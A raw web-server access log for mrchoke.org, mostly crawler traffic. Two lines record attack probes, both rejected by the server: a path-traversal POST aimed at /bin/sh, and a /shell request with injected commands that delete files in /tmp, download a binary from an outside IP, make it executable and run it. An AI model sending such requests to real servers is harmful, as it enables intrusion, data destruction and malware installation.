114.119.147.74 - - [27/Jun/2022:14:33:55 +0000] "GET /node/248?share=reddit HTTP/1.1" 302 154 "https://mrchoke.org/node/248?ak_action=reject_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
40.77.167.43 - - [27/Jun/2022:14:34:01 +0000] "GET /feed/?attachment_id=1096 HTTP/2.0" 403 123 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
114.119.147.74 - - [27/Jun/2022:14:34:02 +0000] "GET /node/248?share=reddit HTTP/1.1" 301 178 "https://mrchoke.org/node/248?ak_action=reject_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.86 - - [27/Jun/2022:14:35:04 +0000] "GET /node/353?ak_action=accept_mobile HTTP/1.1" 302 154 "https://mrchoke.org/node/353?ak_action=reject_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.86 - - [27/Jun/2022:14:35:11 +0000] "GET /node/353?ak_action=accept_mobile HTTP/1.1" 301 178 "https://mrchoke.org/node/353?ak_action=reject_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.86 - - [27/Jun/2022:14:35:18 +0000] "GET /node/353/?ak_action=accept_mobile HTTP/1.1" 200 7953 "https://mrchoke.org/node/353?ak_action=reject_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
216.244.66.229 - - [27/Jun/2022:14:35:19 +0000] "GET /node/1908/gm21000_3 HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
216.244.66.229 - - [27/Jun/2022:14:35:42 +0000] "GET /ch7_6459/ HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
40.77.167.46 - - [27/Jun/2022:14:35:53 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
51.222.253.10 - - [27/Jun/2022:14:36:27 +0000] "GET /img_7719/ HTTP/2.0" 200 7869 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.14 - - [27/Jun/2022:14:36:32 +0000] "GET /wp-content/uploads/2014/02/IMG_7719.jpg HTTP/2.0" 200 2947165 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.14 - - [27/Jun/2022:14:36:34 +0000] "GET /wp-content/uploads/2014/02/IMG_7718-150x150.jpg HTTP/2.0" 200 15716 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.2 - - [27/Jun/2022:14:36:35 +0000] "GET /wp-content/uploads/2014/02/IMG_7720-150x150.jpg HTTP/2.0" 200 13841 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
114.119.147.86 - - [27/Jun/2022:14:36:56 +0000] "GET /node/date/2008/07 HTTP/1.1" 301 178 "https://mrchoke.org/node/151?share=facebook" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.86 - - [27/Jun/2022:14:37:02 +0000] "GET /node/date/2008/07/ HTTP/1.1" 200 8419 "https://mrchoke.org/node/151?share=facebook" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
216.244.66.229 - - [27/Jun/2022:14:38:10 +0000] "GET /node/332/feed HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
216.244.66.229 - - [27/Jun/2022:14:38:14 +0000] "GET /page/5/ HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
51.222.253.1 - - [27/Jun/2022:14:38:59 +0000] "GET /node/date/2012/04/19/ HTTP/2.0" 200 2013 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
114.119.147.74 - - [27/Jun/2022:14:39:23 +0000] "GET /node/71?share=twitter HTTP/1.1" 301 178 "https://mrchoke.org/node/71?share=twitter" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.74 - - [27/Jun/2022:14:39:34 +0000] "GET /node/71/?share=twitter HTTP/1.1" 200 8891 "https://mrchoke.org/node/71?share=twitter" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.74 - - [27/Jun/2022:14:40:33 +0000] "GET /node/date/2014/02/page/5 HTTP/1.1" 302 154 "https://mrchoke.org/node/date/2014/02/page/4" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.74 - - [27/Jun/2022:14:40:40 +0000] "GET /node/date/2014/02/page/5 HTTP/1.1" 301 178 "https://mrchoke.org/node/date/2014/02/page/4" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.74 - - [27/Jun/2022:14:40:49 +0000] "GET /node/date/2014/02/page/5/ HTTP/1.1" 200 16963 "https://mrchoke.org/node/date/2014/02/page/4" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
51.222.253.15 - - [27/Jun/2022:14:41:53 +0000] "GET /page/8/ HTTP/2.0" 200 18106 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
114.119.147.74 - - [27/Jun/2022:14:42:20 +0000] "GET /node/1255/img_6826 HTTP/1.1" 404 134 "https://mrchoke.org/node/1255/img_6812?ak_action=reject_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.86 - - [27/Jun/2022:14:43:59 +0000] "GET /node/category/portege HTTP/1.1" 302 154 "https://mrchoke.org/node/939/img_6419" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.86 - - [27/Jun/2022:14:44:04 +0000] "GET /node/category/portege HTTP/1.1" 301 178 "https://mrchoke.org/node/939/img_6419" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.86 - - [27/Jun/2022:14:44:09 +0000] "GET /node/category/portege/ HTTP/1.1" 200 8292 "https://mrchoke.org/node/939/img_6419" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
51.222.253.8 - - [27/Jun/2022:14:44:32 +0000] "GET /img_7705/ HTTP/2.0" 200 7871 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
87.250.224.3 - - [27/Jun/2022:14:46:02 +0000] "GET /node/352/ HTTP/1.1" 200 8868 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
114.119.147.87 - - [27/Jun/2022:14:46:23 +0000] "GET /node/790/img_6151?share=twitter HTTP/1.1" 302 154 "https://mrchoke.org/node/790/img_6151?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.87 - - [27/Jun/2022:14:46:41 +0000] "GET /node/790/img_6151?share=twitter HTTP/1.1" 301 178 "https://mrchoke.org/node/790/img_6151?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
216.244.66.229 - - [27/Jun/2022:14:46:54 +0000] "GET /wp-content/uploads/2014/01/IMG_6574.jpg HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
51.222.253.18 - - [27/Jun/2022:14:47:27 +0000] "GET /img_7725/ HTTP/2.0" 200 7863 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
114.119.147.87 - - [27/Jun/2022:14:47:50 +0000] "GET /node/790/img_6151?share=twitter HTTP/1.1" 302 154 "https://mrchoke.org/node/790/img_6151?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.87 - - [27/Jun/2022:14:47:58 +0000] "GET /node/790/img_6151?share=twitter HTTP/1.1" 301 178 "https://mrchoke.org/node/790/img_6151?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.87 - - [27/Jun/2022:14:48:03 +0000] "GET /node/790/img_6151/?share=twitter HTTP/1.1" 200 7929 "https://mrchoke.org/node/790/img_6151?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.97 - - [27/Jun/2022:14:48:03 +0000] "GET /node/790/img_6130?share=twitter HTTP/1.1" 302 154 "https://mrchoke.org/node/790/img_6130?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.97 - - [27/Jun/2022:14:48:08 +0000] "GET /node/790/img_6130?share=twitter HTTP/1.1" 301 178 "https://mrchoke.org/node/790/img_6130?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.97 - - [27/Jun/2022:14:48:13 +0000] "GET /node/790/img_6130/?share=twitter HTTP/1.1" 200 7904 "https://mrchoke.org/node/790/img_6130?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
66.249.71.31 - - [27/Jun/2022:14:48:36 +0000] "GET /img_6530/ HTTP/1.1" 200 7886 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
114.119.147.75 - - [27/Jun/2022:14:49:51 +0000] "GET /node/date/2004/08/12 HTTP/1.1" 302 154 "https://mrchoke.org/node/390?share=reddit" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.75 - - [27/Jun/2022:14:49:56 +0000] "GET /node/date/2004/08/12 HTTP/1.1" 301 178 "https://mrchoke.org/node/390?share=reddit" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
216.244.66.229 - - [27/Jun/2022:14:49:59 +0000] "GET /ch7_3397/ HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
51.222.253.10 - - [27/Jun/2022:14:50:01 +0000] "GET /robots.txt HTTP/1.1" 404 134 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
114.119.147.75 - - [27/Jun/2022:14:50:05 +0000] "GET /node/date/2004/08/12/ HTTP/1.1" 200 8225 "https://mrchoke.org/node/390?share=reddit" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
51.222.253.15 - - [27/Jun/2022:14:50:25 +0000] "GET /img_7669/ HTTP/2.0" 200 7873 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
207.46.13.149 - - [27/Jun/2022:14:50:34 +0000] "GET /node/414/feed HTTP/2.0" 301 178 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.149 - - [27/Jun/2022:14:50:43 +0000] "GET /node/414/feed/ HTTP/2.0" 403 123 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
185.191.171.25 - - [27/Jun/2022:14:50:54 +0000] "GET /robots.txt HTTP/1.1" 404 134 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.33 - - [27/Jun/2022:14:50:55 +0000] "GET /node/184 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.24 - - [27/Jun/2022:14:50:58 +0000] "GET /node/184/ HTTP/1.1" 200 8657 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
114.119.147.86 - - [27/Jun/2022:14:52:12 +0000] "GET /node/573?share=twitter HTTP/1.1" 302 154 "https://mrchoke.org/node/573?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.86 - - [27/Jun/2022:14:52:17 +0000] "GET /node/573?share=twitter HTTP/1.1" 301 178 "https://mrchoke.org/node/573?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.86 - - [27/Jun/2022:14:52:30 +0000] "GET /node/573/?share=twitter HTTP/1.1" 200 8011 "https://mrchoke.org/node/573?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
51.222.253.16 - - [27/Jun/2022:14:53:02 +0000] "GET /img_7724/ HTTP/2.0" 200 7872 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
185.7.214.104 - - [27/Jun/2022:14:54:07 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 166 "-" "-"
114.119.147.86 - - [27/Jun/2022:14:54:41 +0000] "GET /node/465?share=reddit HTTP/1.1" 302 154 "https://mrchoke.org/node/465?ak_action=reject_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.86 - - [27/Jun/2022:14:54:55 +0000] "GET /node/465?share=reddit HTTP/1.1" 301 178 "https://mrchoke.org/node/465?ak_action=reject_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
51.222.253.3 - - [27/Jun/2022:14:55:58 +0000] "GET /node/939/img_6442/ HTTP/2.0" 200 7869 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
74.125.210.177 - - [27/Jun/2022:14:56:14 +0000] "GET /feed HTTP/1.1" 404 134 "-" "FeedFetcher-Google; (+http://www.google.com/feedfetcher.html)"
207.46.13.174 - - [27/Jun/2022:14:58:30 +0000] "GET /feed/?attachment_id=1290 HTTP/2.0" 403 123 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
51.222.253.8 - - [27/Jun/2022:14:59:01 +0000] "GET /img_7134/ HTTP/2.0" 200 7901 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
185.191.171.15 - - [27/Jun/2022:14:59:33 +0000] "GET /robots.txt HTTP/1.1" 404 134 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.19 - - [27/Jun/2022:14:59:34 +0000] "GET /node/tag/ipad HTTP/1.1" 302 154 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.2 - - [27/Jun/2022:14:59:35 +0000] "GET /node/tag/ipad HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
87.250.224.3 - - [27/Jun/2022:15:00:25 +0000] "GET /node/category/gnome/ HTTP/1.1" 200 9354 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
51.222.253.6 - - [27/Jun/2022:15:02:21 +0000] "GET /img_7666/ HTTP/2.0" 200 7883 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.10 - - [27/Jun/2022:15:02:29 +0000] "GET /wp-content/uploads/2014/02/IMG_7666.jpg HTTP/2.0" 200 2142346 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.13 - - [27/Jun/2022:15:02:32 +0000] "GET /wp-content/uploads/2014/02/IMG_7669-150x150.jpg HTTP/2.0" 200 12155 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
40.77.167.46 - - [27/Jun/2022:15:05:34 +0000] "GET /wp-content/uploads/2013/12/Screenshot-2013-12-06-14.59.49.png HTTP/2.0" 302 154 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
51.222.253.12 - - [27/Jun/2022:15:05:36 +0000] "GET /img_7722/ HTTP/2.0" 200 7879 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
40.77.167.46 - - [27/Jun/2022:15:05:44 +0000] "GET /wp-content/uploads/2013/12/Screenshot-2013-12-06-14.59.49.png HTTP/2.0" 200 28777 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
51.222.253.11 - - [27/Jun/2022:15:08:07 +0000] "GET /img_7102/ HTTP/2.0" 200 7872 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.13 - - [27/Jun/2022:15:08:10 +0000] "GET /wp-content/uploads/2014/01/IMG_7128-150x150.jpg HTTP/2.0" 200 27948 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.11 - - [27/Jun/2022:15:08:13 +0000] "GET /wp-content/uploads/2014/01/IMG_7108-150x150.jpg HTTP/2.0" 200 26578 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
114.119.147.87 - - [27/Jun/2022:15:08:17 +0000] "GET /node/182 HTTP/1.1" 302 154 "https://mrchoke.org/node/date/2007/03/29" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
51.222.253.18 - - [27/Jun/2022:15:08:20 +0000] "GET /wp-content/uploads/2014/01/IMG_7102-766x766.jpg HTTP/2.0" 200 124450 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
114.119.147.87 - - [27/Jun/2022:15:08:27 +0000] "GET /node/182 HTTP/1.1" 301 178 "https://mrchoke.org/node/date/2007/03/29" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
51.222.253.1 - - [27/Jun/2022:15:10:57 +0000] "GET /img_7174/ HTTP/2.0" 200 7948 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.10 - - [27/Jun/2022:15:13:41 +0000] "GET /img_7094/ HTTP/2.0" 200 7875 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
185.191.171.16 - - [27/Jun/2022:15:16:20 +0000] "GET /node/1786/ch7_4256-copy HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.43 - - [27/Jun/2022:15:16:22 +0000] "GET /node/1786/ch7_4256-copy/ HTTP/1.1" 200 7919 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
51.222.253.15 - - [27/Jun/2022:15:16:27 +0000] "GET /img_6904/ HTTP/2.0" 200 7873 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
45.164.20.136 - - [27/Jun/2022:15:16:29 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 193.233.48.38/reaper/reap.arm4;chmod+777+/tmp/reap.arm4;sh+/tmp/reap.arm4 HTTP/1.1" 404 162 "-" "Hello, world"
216.244.66.229 - - [27/Jun/2022:15:18:39 +0000] "GET /robots.txt HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
216.244.66.229 - - [27/Jun/2022:15:18:39 +0000] "GET /robots.txt HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
51.222.253.9 - - [27/Jun/2022:15:18:51 +0000] "GET /img_7093/ HTTP/2.0" 200 7875 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.14 - - [27/Jun/2022:15:18:54 +0000] "GET /wp-content/uploads/2014/01/IMG_7046-150x150.jpg HTTP/2.0" 200 27177 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.11 - - [27/Jun/2022:15:18:55 +0000] "GET /wp-content/uploads/2014/01/IMG_7094-150x150.jpg HTTP/2.0" 200 21359 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.11 - - [27/Jun/2022:15:19:05 +0000] "GET /wp-content/uploads/2014/01/IMG_7093.jpg HTTP/2.0" 200 4451017 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
185.191.171.22 - - [27/Jun/2022:15:20:56 +0000] "GET /img_6569 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.15 - - [27/Jun/2022:15:20:59 +0000] "GET /img_6569/ HTTP/1.1" 200 7887 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
51.222.253.13 - - [27/Jun/2022:15:21:18 +0000] "GET /img_7043/ HTTP/2.0" 200 7869 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
216.244.66.229 - - [27/Jun/2022:15:23:42 +0000] "GET /node/835/img_6245 HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
216.244.66.229 - - [27/Jun/2022:15:23:49 +0000] "GET /node/865/ch7_3057 HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
216.244.66.229 - - [27/Jun/2022:15:23:56 +0000] "GET /node/865/ch7_3141 HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
216.244.66.229 - - [27/Jun/2022:15:24:00 +0000] "GET /node/865/ch7_3236 HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
51.222.253.2 - - [27/Jun/2022:15:24:03 +0000] "GET /node/category/training/ HTTP/2.0" 200 12607 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
216.244.66.229 - - [27/Jun/2022:15:24:05 +0000] "GET /img_7519/ HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
51.222.253.9 - - [27/Jun/2022:15:24:05 +0000] "GET /gallery2/main.php?g2_view=core.DownloadItem&g2_itemId=480&g2_serialNumber=2 HTTP/2.0" 404 123 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.17 - - [27/Jun/2022:15:24:07 +0000] "GET /gallery2/main.php?g2_view=core.DownloadItem&g2_itemId=436&g2_serialNumber=2 HTTP/2.0" 404 123 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
54.36.148.157 - - [27/Jun/2022:15:24:07 +0000] "GET /gallery2/main.php?g2_view=core.DownloadItem&g2_itemId=2611&g2_serialNumber=2 HTTP/1.1" 404 134 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.9 - - [27/Jun/2022:15:24:08 +0000] "GET /gallery2/main.php?g2_view=core.DownloadItem&g2_itemId=484&g2_serialNumber=2 HTTP/2.0" 404 123 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
54.36.148.29 - - [27/Jun/2022:15:24:09 +0000] "GET /gallery2/main.php?g2_view=core.DownloadItem&g2_itemId=2512&g2_serialNumber=2 HTTP/1.1" 404 134 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.1 - - [27/Jun/2022:15:24:10 +0000] "GET /gallery2/main.php?g2_view=core.DownloadItem&g2_itemId=448&g2_serialNumber=2 HTTP/2.0" 404 123 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.18 - - [27/Jun/2022:15:24:11 +0000] "GET /gallery2/main.php?g2_view=core.DownloadItem&g2_itemId=476&g2_serialNumber=2 HTTP/2.0" 404 123 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.7 - - [27/Jun/2022:15:24:13 +0000] "GET /gallery2/main.php?g2_view=core.DownloadItem&g2_itemId=460&g2_serialNumber=2 HTTP/2.0" 404 123 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
192.241.220.135 - - [27/Jun/2022:15:26:23 +0000] "GET /actuator/health HTTP/1.1" 301 178 "-" "Mozilla/5.0 zgrab/0.x"
51.222.253.15 - - [27/Jun/2022:15:26:41 +0000] "GET /node/category/block/ HTTP/2.0" 200 10764 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
216.244.66.229 - - [27/Jun/2022:15:26:56 +0000] "GET /node/tag/bike/page/4 HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
